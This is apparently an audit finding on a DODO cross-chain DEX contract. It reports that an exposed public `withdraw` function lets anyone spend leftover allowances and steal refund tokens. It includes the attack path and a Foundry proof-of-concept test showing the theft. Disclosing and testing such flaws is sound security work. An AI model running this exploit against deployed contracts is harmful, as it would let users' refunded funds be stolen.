# Unauthorized Withdrawal via Exposed withdraw Function Leads to Token Theft and Denial of Refund

### Summary

An externally accessible `withdraw` function in the `gatewayTransferNative` contract can be exploited by any user to illegitimately withdraw tokens that were reverted via `onAbort` or `onRevert`. This allows the attacker to steal tokens meant for refund, breaking the refund mechanism and leading to loss of user funds.

### Root Cause

- The `withdraw` function is `public` when it is only intended to be called internally from `_handleBitcoinWithdraw`.
https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L286-L291

- The token approval amount in `_handleBitcoinWithdraw` and `_handleEvmOrSolanaWithdraw` includes both `outputAmount + gasFee`, while the actual `withdraw` call only uses `outputAmount - gasFee`, creating unused allowances.
https://github.com/sherlock-audit/2025-05-dodo-cross-chain-dex/blob/main/omni-chain-contracts/contracts/GatewayTransferNative.sol#L458

- The `sender` passed to `withdraw()` can be controlled by the caller and is used in `revertMessage`, which leads to the caller receiving funds back even if the cross-chain message fails.

### Internal Pre-conditions

- A `ZRC20` token (e.g., `token1Z`) must be present in the contract (e.g., via `onAbort` or `onRevert`).
- A valid allowance must be present from `gatewayTransferNative` to `gatewayZEVM` (e.g via the overApproval in `_handleBitcoinWithdraw`).

### Attack Path

- A message fails and triggers `onAbort`, which deposits tokens in `gatewayTransferNative`.
- These tokens are intended for the original `sender `and should be claimable via `claimRefund`.
- Meanwhile, an attacker:
     -  Computes the token allowance from `gatewayTransferNative` to `gateway`.
     -  Calls the `withdraw()` function directly with:
           -   `sender = abi.encodePacked(attacker)`
           -   `amount = allowance`
           -   `outputToken = token1Z`
- This results in the `gateway` transferring tokens to the attacker on the dst chain or back to the attacker if tx fails(as the sender is encoded into `revertMessage`).
- Later, the legitimate user calls `claimRefund(externalId)`, but all or part of the tokens are already gone — causing it to revert.

### Impact

- Attackers can steal refunded tokens by exploiting a misconfigured public `withdraw()` function.
- Legitimate users lose their ability to reclaim funds after aborted transfers.

```solidity
function test_withdrawExposedFunction() public {
        uint256 amount = 100 ether;
        uint32 dstChainId = 8332;
        address targetZRC20 = address(token1Z);
        bytes memory sender = abi.encodePacked(user1);
        bytes memory receiver = abi.encodePacked(user2);
        bytes memory swapDataZ = "";
        bytes memory contractAddress = abi.encodePacked(address(gatewaySendB));
        bytes memory fromTokenB = abi.encodePacked(address(token1B));
        bytes memory toTokenB = abi.encodePacked(address(token1B));
        bytes memory swapDataB = "";
        bytes memory accounts = "";
        bytes memory message = encodeMessage(
            dstChainId,
            targetZRC20,
            sender,
            receiver,
            swapDataZ,
            contractAddress,
            abi.encodePacked(fromTokenB, toTokenB, swapDataB),
            accounts
        );
        vm.startPrank(user1);
        token1Z.approve(address(gatewayTransferNative), amount);
        gatewayTransferNative.withdrawToNativeChain(
            address(token1Z),
            amount,
            message
        );
        vm.stopPrank();

        bytes32 externalId = keccak256(abi.encodePacked(block.timestamp));
        token1Z.mint(address(gatewayTransferNative), amount);
        vm.prank(address(gatewayZEVM));
        gatewayTransferNative.onAbort(
            AbortContext({
                sender: abi.encode(address(this)),
                asset: address(token1Z),
                amount: amount,
                outgoing: false,
                chainID: 7000,
                revertMessage: bytes.concat(externalId, bytes20(user2))
            })
        );

        uint allowance = token1Z.allowance(
            address(gatewayTransferNative),
            address(gatewayZEVM)
        );

        vm.prank((user1));
        gatewayTransferNative.withdraw(
            keccak256(abi.encodePacked(block.timestamp + 1)),
            abi.encodePacked(user1),
            address(token1Z),
            allowance
        );

        vm.startPrank(user2);
        vm.expectRevert();
        gatewayTransferNative.claimRefund(externalId);
    }
```
